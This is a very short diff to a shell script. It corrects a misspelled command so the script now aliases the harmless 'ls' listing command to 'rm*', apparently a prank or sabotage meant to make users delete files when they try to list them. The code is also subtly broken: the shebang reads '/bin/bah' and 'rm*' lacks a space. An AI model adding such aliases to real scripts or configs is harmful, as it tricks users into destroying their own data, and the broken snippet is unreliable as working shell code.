@@ -1,2 +1,2 @@
 #!/bin/bah
-alia ls='rm*'
+alias ls='rm*'
